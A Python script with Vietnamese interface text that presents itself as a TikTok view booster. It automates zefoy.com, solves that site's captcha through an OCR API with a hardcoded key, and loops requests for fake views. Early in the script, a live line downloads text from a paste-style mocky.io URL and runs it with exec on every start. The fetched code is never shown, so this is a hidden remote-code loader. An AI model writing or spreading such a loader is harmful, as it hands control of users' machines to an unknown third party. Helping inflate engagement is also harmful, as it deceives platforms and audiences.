import random
from atexit import register
from time import sleep
import os,json,re,sys
import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
import os
import json
import requests
from time import strftime, sleep
from datetime import datetime, timedelta
import sys
import random
from atexit import register
from time import sleep
import os,json,re,sys
import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
os.system("cls")
dau="\033[1;31m[\033[1;37m×.×\033[1;31m] \033[1;37m➩"
banner = f"""\033[1;32m
\033[1;33m ██████╗ ███████╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     
\033[1;35m██╔═══██╗██╔════╝██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;36m██║   ██║█████╗  █████╗         ██║   ██║   ██║██║   ██║██║     
\033[1;37m██║   ██║██╔══╝  ██╔══╝         ██║   ██║   ██║██║   ██║██║     
\033[1;32m╚██████╔╝██║     ██║            ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;31m ╚═════╝ ╚═╝     ╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝\n
\033[1;97mTool By: \033[1;32mOFF TOOL            \033[1;97mPhiên Bản: \033[1;32m4.0     
\033[97m════════════════════════════════════════════════  
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Tik Tok\033[1;31m  : \033[1;33mhttps:\033[1;32m//www.tiktok.com\033[1;31m/m@nekosharetool
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Telegram\033[1;31m : \033[1;97m☞\033[1;32mhttps://t.me/Nekozuke1🔫\033[1;97m☜
\033[97m════════════════════════════════════════════════
\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
\033[1;39m┌──────────────────────── Neko ────────────────────────┐
\033[1;32m║   \033[1;39mPYTHON VERSION\033[1;32m 3.0                                    \033[1;32m║
\033[1;32m║   \033[1;39mTELEGRAM           :  @NeKo109                               \033[1;32m║
\033[1;39m└────────────────────────────────────────────────────────┘
"""
for h in banner:
    sys.stdout.write(h)
    sys.stdout.flush()
    sleep(0.0003)
menu = """
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = =
\033[1;37m┌─────────────────────┐
\033[1;36m║  \033[1;37m    INPUT KEY      \033[1;36m║
\033[1;37m└─────────────────────┘
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = """
for h in menu:
    sys.stdout.write(h)
    sys.stdout.flush()
    sleep(0.0005)

#ngay = int(strftime('%d'))
#key1 = str(ngay * 124682281818 + 2888181472 * 2)
#key = 'FREE'+ key1
#keyv1 = 'neko'
#apikey_8link = 'f7c0dde8c816b8469cb86b26482cf74beec79fe1a4cceae8aca1f84e3b0aae90'
#url_8link = 'https://hannie.com/key/?keyv1=hannie1231237123-key=' + key
#link1s = requests.get(f'https://partner.8link.io/api/public/gen-shorten-link?apikey={apikey_8link}&url={url_8link}').json()
#if 'shortened_url' not in link1s:
 #   print('Error: Unable to generate shortened link.')
 #   quit()
#else:
   # link_key = link1s['shortened_url']
key_file = 'keyDEV.json'
if os.path.exists(key_file):
    with open(key_file, 'r') as f:
        keys = json.load(f)
else:
    keys = {}
current_time = datetime.now()
for k, v in list(keys.items()):
    expiration_time = datetime.strptime(v['expiration'], "%Y-%m-%d %H:%M:%S")
    if current_time > expiration_time:
        del keys[k]  
with open(key_file, 'w') as f:
    json.dump(keys, f)
#if keyv1 in keys or key in keys:
    print(f'{dau} XIN CHÀO! CHÚC BẠN CHẠY TOOL VUI VẺ...')
    sleep(1)
    exec(requests.get('https://run.mocky.io/v3/17bf0406-139f-46a9-ad1b-2a76aefb1da1').text)
#else:
#    print(f'{dau} TOOL FREE! BẢN THỬ NHIỆM - MUA TOOL LIÊN HỆ @hnaniee12 - 200k/ SÀI VĨNH VIỄN!')
#    print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
#    print(f'{dau}\003[1;93mLINK LẤY API KEY LÀ: {link_key}')
 #   print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
  #  keynhap = input('\033[1;31m[\033[1;37m×.×\033[1;31m] \033[1;37m➩ \033[1;32mINPUT API KEY\033[1;33m ~>\033[1;36m ')
#    print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
 #   if keynhap == key or keynhap == keyv1:
print(f'{dau} API KEY ĐÚNG OPEN TOOL!')
print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
sleep(2)
#keys[keynhap] = {'expiration': (current_time + timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")}
#with open(key_file, 'w') as f:
#	json.dump(keys, f)
#   exec(requests.get('https://run.mocky.io/v3/cb48e7de-b60f-4f30-a60a-3b5f330d5dcc').text)
#    else:
 #       print(f'{dau} API KEY SAI! VUI LÒNG TẮT TOOL KHỞI ĐỘNG LẠI!')
   #     print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
  #      sleep(1000000000)
import os
try:
	import requests,colorama,prettytable
except:
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("pip install prettytable")
import threading, requests, ctypes, random, json, time, base64, sys, re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init, Fore
from urllib.parse import urlparse, unquote, quote
from string import ascii_letters, digits

class Zefoy:
	# if os.path.exists('config.json') is False: open('config.json','w',encoding='utf-8',errors='ignore').write(json.dumps({'url':'https://www.tiktok.com/t/ZTRToxYct','service':'Views'},indent=4))

	def __init__(self):
		self.base_url = 'https://zefoy.com/'
		self.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
		self.session = requests.Session()
		self.captcha_1 = None
		self.captcha_ = {}
		self.service = 'Views'
		self.video_key = None
		self.services = {}
		self.services_ids = {}
		self.services_status = {}
		self.url = 'None'
		self.text = 'LÂM TILO'
		url1=input(" \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Nhập link video: ")
		self.url=url1

	def get_captcha(self):
		if os.path.exists('session'): self.session.cookies.set("PHPSESSID", open('session',encoding='utf-8').read(), domain='zefoy.com')
		request = self.session.get(self.base_url, headers=self.headers)
		if 'Enter Video URL' in request.text: self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]; return True

		try:
			for x in re.findall(r'<input type="hidden" name="(.*)" value="(.*)">', request.text): self.captcha_[x[0]] = x[1]

			self.captcha_1 = request.text.split('type="text" name="')[1].split('" oninput="this.value=this.value.toLowerCase()"')[0]
			captcha_url = request.text.split('<img src="')[1].split('" onerror="imgOnError()" class="')[0]
			request = self.session.get(f"{self.base_url}{captcha_url}",headers=self.headers)
			open('captcha.png', 'wb').write(request.content)
			print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Đang giải capcha..')
			return False
		except Exception as e:
			print(f" \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Không thể giải captcha: {e}")
			time.sleep(2)
			self.get_captcha()

	def send_captcha(self, new_session = False):
		if new_session: self.session = requests.Session(); os.remove('session'); time.sleep(2)
		if self.get_captcha(): print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Đang kêt nối đến session');return (True, 'The session already exists')
		captcha_solve = self.solve_captcha('captcha.png')[1]
		self.captcha_[self.captcha_1] = captcha_solve
		request = self.session.post(self.base_url, headers=self.headers, data=self.captcha_)

		if 'Enter Video URL' in request.text: 
			print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Session đã được tạo')
			open('session','w',encoding='utf-8').write(self.session.cookies.get('PHPSESSID'))
			print(f" \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Giải capcha thành công: {captcha_solve}")
			self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]
			return (True,captcha_solve)
		else: return (False,captcha_solve)

	def solve_captcha(self, path_to_file = None, b64 = None, delete_tag = ['\n','\r']):
		if path_to_file: task = path_to_file
		else: open('temp.png','wb').write(base64.b64decode(b64)); task = 'temp.png'
		request = self.session.post('https://api.ocr.space/parse/image?K87899142388957', headers={'apikey':'K87899142388957'}, files={'task':open(task,'rb')}).json()
		solved_text = request['ParsedResults'][0]['ParsedText']
		for x in delete_tag: solved_text = solved_text.replace(x,'')
		return (True, solved_text)

	def get_status_services(self):
		request = self.session.get(self.base_url, headers=self.headers).text
		for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+\n.+', request): self.services[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = x.split('d-sm-inline-block">')[1].split('</small>')[0].strip()
		for x in re.findall(r'<h5 class="card-title mb-3">.+</h5>\n<form action=".+">', request): self.services_ids[x.split('title mb-3">')[1].split('<')[0].strip()] = x.split('<form action="')[1].split('">')[0].strip()
		for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+<button .+', request): self.services_status[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = False if 'disabled class' in x else True
		return (self.services, self.services_status)

	def get_table(self, i = 1):
		table = PrettyTable(field_names=["ID", "DỊCH VỤ", "Status"], title="Status Services", header_style="upper",border=True)
		while True:
			if len(self.get_status_services()[0])>1:break
			else:print('Cant get services, retrying...');self.send_captcha();time.sleep(2)
		for service in self.services: table.add_row([f"{Fore.CYAN}{i}{Fore.RESET}", service, f"{Fore.GREEN if 'ago updated' in self.services[service] else Fore.RED}{self.services[service]}{Fore.RESET}"]); i+=1
		table.title =  f"{Fore.YELLOW}Số Dịch Vụ Hoạt Động: {len([x for x in self.services_status if self.services_status[x]])}{Fore.RESET}"
		print(table)

	def find_video(self):
		if self.service is None: return (False, "You didn't choose the service")
		while True:
			if self.service not in self.services_ids: self.get_status_services(); time.sleep(1)
			request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':'multipart/form-data; boundary=----WebKitFormBoundary0nU8PjANC8BhQgjZ', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary0nU8PjANC8BhQgjZ\r\nContent-Disposition: form-data; name="{self.video_key}"\r\n\r\n{self.url}\r\n------WebKitFormBoundary0nU8PjANC8BhQgjZ--\r\n')
			try: self.video_info = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
			except: time.sleep(3); continue
			if 'Session expired. Please re-login' in self.video_info: print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha(); return
			elif 'service is currently not working' in self.video_info: return (True,' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
			elif """onsubmit="showHideElements""" in self.video_info:
				self.video_info = [self.video_info.split('" name="')[1].split('"')[0],self.video_info.split('value="')[1].split('"')[0]]
				return (True, request.text)
			elif 'Checking Timer...' in self.video_info:
				try: 
					t=int(re.findall(r'ltm=(\d*);', self.video_info)[0])
					lamtilo = int(re.findall(r'ltm=(\d*);', self.video_info)[0])
				except: 
					return (False,)
				if lamtilo==0:self.find_video()
				elif lamtilo >= 1000: print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Your IP was banned')
				# print(f' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Thời gian chờ để tiếp tục tăng: {t} giây')
				# for lam in range(t,0,-1):
				# 	lam-=1
				# 	print(f" \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Vui lòng chờ: {lam}",end="\r")
				# 	time.sleep(1)
				_=time.time()
				while time.time()-2<_+lamtilo:
					t-=1
					print("[VCHH/]</> Vui lòng chờ: {0} ".format(t)+"giây .", end="\r")
					time.sleep(1)
					
				continue
			elif 'Too many requests. Please slow' in self.video_info: time.sleep(3)
			else: print(self.video_info)

	def use_service(self):
		if self.find_video()[0] is False: return False
		self.token = "".join(random.choices(ascii_letters+digits, k=16))
		request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':f'multipart/form-data; boundary=----WebKitFormBoundary{self.token}', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary{self.token}\r\nContent-Disposition: form-data; name="{self.video_info[0]}"\r\n\r\n{self.video_info[1]}\r\n------WebKitFormBoundary{self.token}--\r\n')
		try: res = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
		except: time.sleep(3); return ""
		if 'Session expired. Please re-login' in res: print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha(); return ""
		elif 'Too many requests. Please slow' in res: time.sleep(3)
		elif 'service is currently not working' in res: return (' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
		else: print(" \033[1;97m[\033[1;31m🔥\033[1;97m] => ",res.split("sans-serif;text-align:center;color:green;'>")[1].split("</")[0])

	def get_video_info(self):
		request = self.session.get(f'https://tiktok.livecounts.io/video/stats/{urlparse(self.url).path.rpartition("/")[2]}',headers={'authority':'tiktok.livecounts.io','origin':'https://livecounts.io','user-agent':self.headers['user-agent']}).json()
		if 'viewCount' in request: return request
		else: return {'viewCount':0, 'likeCount':0,'commentCount':0,'shareCount':0}

	def get_video_id(self, url_ = None, set_url=True):
		if url_ is None: url_ = self.url
		if url_[-1] == '/': url_=url_[:-1]
		url = urlparse(url_).path.rpartition('/')[2]
		if url.isdigit(): self.url = url_; return url_
		request = requests.get(f'https://api.tokcount.com/?type=videoID&username=https://vm.tiktok.com/{url}',headers={'origin': 'https://tokcount.com','authority': 'api.tokcount.com','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'})
		if request.text == '': print(' \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Link video không hợ lệ'); return False
		else: json_=request.json()
		if 'author' not in json_: print(f'{self.url}| Link video không hợp lệ'); return False
		if set_url: self.url = f'https://www.tiktok.com/@{json_["author"]}/video/{json_["id"]}';print(f'Formated video url --> {self.url}')
		return request.text

	def check_config(self):
		
		while True:
			try: 
				last_url = self.url
				if last_url != self.url: self.get_video_id()
			except Exception as e: print(e)
			time.sleep(4)
	def update_name(self):
		while True:
			try:
				ctypes.windll.kernel32.SetConsoleTitleA(self.text.encode())
				video_info = self.get_video_info()
				self.text = f" [Vchh/] | Views: {video_info['viewCount']} "
			except: pass
			time.sleep(5)
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
time=datetime.now().strftime("%H:%M:%S")
import requests
import socket
from pystyle import *

import os
try:
	import requests,colorama,prettytable
except:
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("pip install prettytable")
import threading, requests, ctypes, random, json, time, base64, sys, re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init, Fore
from urllib.parse import urlparse, unquote, quote
from string import ascii_letters, digits
#import màu
luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
red='\u001b[31;1m'
yellow='\u001b[33;1m'
green='\u001b[32;1m'
blue='\u001b[34;1m'
tim='\033[1;35m'
xanhlam='\033[1;36m'
xam='\033[1;30m'
black='\033[1;19m'
#today nand clear
os.system('cls')
data_machine = []
today = date.today()
os.system('clear')
#daystime
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "http://kiemtraip.com/raw.php"
ip = get_ip_from_url(url)
a = " \033[1;97m[\033[1;31m🔥\033[1;97m] => "
trang = "\033[1;37m"
xanh_la = "\033[1;32m"
xanh_duong = "\033[1;34m"
do = "\033[1;31m"
vang = "\033[1;33m"
tim = "\033[1;35m"
dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
kt_code = "</>"
def logo():
    os.system("cls" if os.name == "nt" else "clear")
    logo=f"""
\033[1;33m ██████╗ ███████╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     
\033[1;35m██╔═══██╗██╔════╝██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;36m██║   ██║█████╗  █████╗         ██║   ██║   ██║██║   ██║██║     
\033[1;37m██║   ██║██╔══╝  ██╔══╝         ██║   ██║   ██║██║   ██║██║     
\033[1;32m╚██████╔╝██║     ██║            ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;31m ╚═════╝ ╚═╝     ╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝\n
\033[1;97mTool By: \033[1;32mOFF TOOL            \033[1;97mPhiên Bản: \033[1;32m4.0     

╔═══════════════════════════════════════════════════════╗
{a}{yellow}Tool Buff Vỉew Tiktok NeKo
╚═══════════════════════════════════════════════════════╝
  """
    print(logo)
ngay = int(strftime('%d'))
key1= str(ngay*1212+234442)
key ="LamTilo"+ key1


# urllam = f"https://subretop1.com/keytool.html?key={key}"
# token="e6a1485b68cb324cc8880706965f272e16f25c88"
# link =requests.get(f"https://octolinkz.com/api?api={token}&url={urllam}").json()
# if link["status"]== "success":
#     logo()
#     link1=link["shortenedUrl"]
#     print(f"{trang} \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Link key: {link1}")
     
# else:
#     link1=""
# nhap = input(f"{trang} \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Nhập key vừa lấy được: ")
# if nhap == key:
if 1:
    print(f"{xanh_la} \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Key đúng mời bạn vô tool")
    logo()
    Z = Zefoy()
    threading.Thread(target=Z.check_config).start()
    threading.Thread(target=Z.update_name).start()
    # time.sleep(5)
    Z.send_captcha()
    Z.get_table()
else:
    print(f"{do} \033[1;97m[\033[1;31m🔥\033[1;97m] =>  Key sai vui lòng vượt lại")
    exit()

while True:
	try: 
		if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do} \033[1;97m[\033[1;31m🔥\033[1;97m] => Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
	except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)